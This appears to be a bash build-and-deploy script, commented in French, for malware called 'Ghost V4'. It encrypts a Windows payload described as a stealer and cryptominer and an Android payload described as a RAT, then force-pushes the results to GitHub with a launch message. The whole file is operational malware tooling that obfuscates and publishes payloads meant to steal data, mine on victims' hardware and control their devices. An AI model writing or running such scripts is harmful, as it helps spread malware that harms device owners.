#!/bin/bash
# Chiffrement PC (Stealer/Minage) et Mobile (RAT) [cite: 2025-08-28]
python3 rotator.py main.py GHOST_PC_2026 payload_win.dat
python3 rotator.py main_and.py GHOST_MOB_2026 payload_and.dat

# Envoi forcé vers GitHub
git add .
git commit -m "Deploy Ghost V4 Hybride"
git push origin main --force
echo "🚀 GHOST V4 EST MAINTENANT EN LIGNE !"i
